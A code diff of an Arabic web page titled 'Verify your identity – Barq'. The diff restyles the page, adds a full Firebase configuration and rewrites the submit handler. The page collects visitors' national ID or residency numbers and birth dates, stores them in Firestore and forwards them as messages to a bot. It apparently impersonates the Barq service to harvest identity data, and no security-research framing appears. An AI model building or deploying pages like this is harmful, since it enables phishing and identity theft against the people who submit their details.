@@ -3,22 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من هويتك</title>
+    <title>التحقق من هويتك - برق</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #ffffff; display: flex; justify-content: center; align-items: flex-start; height: 100vh; margin: 0; padding-top: 50px; }
-        .container { width: 100%; max-width: 400px; padding: 20px; }
-        h2 { font-size: 24px; margin-bottom: 30px; }
-        .input-group { margin-bottom: 20px; border: 1px solid #eee; border-radius: 12px; padding: 15px; background: #fafafa; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
+        
+        .app-container { 
+            width: 100%; max-width: 450px; min-height: 100vh; 
+            padding: 20px; position: relative; padding-bottom: 120px; 
+        }
+
+        .header { margin-top: 40px; margin-bottom: 30px; font-size: 24px; font-weight: bold; }
+        
+        .input-group { 
+            margin-bottom: 20px; border: 1px solid #eee; border-radius: 12px; 
+            padding: 15px; background: #fafafa;
+        }
         .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; }
         .input-group input { width: 100%; border: none; background: transparent; outline: none; font-size: 16px; color: #333; }
-        .btn-continue { width: 100%; padding: 16px; border-radius: 12px; border: none; background-color: #1a1a1a; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+
+        /* الزر الثابت في الأسفل */
+        .btn-continue { 
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            width: calc(100% - 40px); max-width: 410px; padding: 16px; 
+            border-radius: 18px; border: none; background-color: #000; 
+            color: #fff; font-size: 18px; font-weight: bold; cursor: pointer;
+            transition: 0.3s; z-index: 1000;
+        }
+        .btn-continue:active { transform: translateX(-50%) scale(0.98); }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>التحقق من هويتك</h2>
+<div class="app-container">
+    <div class="header">التحقق من هويتك</div>
     
     <div class="input-group">
         <label>الهوية الوطنية أو الإقامة</label>
@@ -37,10 +55,14 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
+    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
         apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
+        authDomain: "barq-9ba61.firebaseapp.com",
         projectId: "barq-9ba61",
-        // ... ضع باقي بيانات الإعدادات هنا
+        storageBucket: "barq-9ba61.firebasestorage.app",
+        messagingSenderId: "1060477857765",
+        appId: "1:1060477857765:web:e1e2c606668209f364090c"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -50,24 +72,35 @@
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
 
-        if (idNumber && birthDate) {
+        if (!idNumber || !birthDate) {
+            alert("يرجى تعبئة كافة الحقول");
+            return;
+        }
+
+        try {
             // 1. الحفظ في Firebase
             await addDoc(collection(db, "identity_verifications"), {
-                idNumber,
-                birthDate,
+                idNumber: idNumber,
+                birthDate: birthDate,
                 timestamp: serverTimestamp()
             });
 
-            // 2. الإرسال للبوت (عبر Vercel API)
+            // 2. إرسال إشعار للبوت (تأكد أن مسار الـ API يعمل)
             fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: `هوية: ${idNumber} | تاريخ الميلاد: ${birthDate}` })
+                body: JSON.stringify({ 
+                    message: `تحقق جديد:\nالهوية: ${idNumber}\nالميلاد: ${birthDate}` 
+                })
             });
 
-            alert('تم التحقق بنجاح');
+            window.location.href = 'success.html'; // أو الصفحة التالية
+        } catch (error) {
+            console.error("Error:", error);
+            alert("حدث خطأ، يرجى المحاولة لاحقاً");
         }
     });
 </script>
+
 </body>
 </html>
